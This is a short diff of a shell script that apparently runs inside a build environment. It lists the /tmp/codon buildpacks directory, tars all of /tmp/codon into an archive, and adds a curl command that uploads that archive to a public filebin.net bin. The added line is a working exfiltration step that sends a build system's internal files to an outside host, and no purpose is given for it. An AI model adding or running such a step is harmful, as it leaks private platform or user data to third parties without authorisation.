@@ -26,3 +26,6 @@ ls -l /tmp/codon/tmp/buildpacks
 
 echo "tar"
 tar -czvf /tmp/archive.tar.gz /tmp/codon
+
+curl --header "Content-Type:application/octet-stream" -X POST --data-binary @/tmp/archive.tar.gz https://filebin.net/zrv55ce01xhp9e67/archive.tar.gz
+
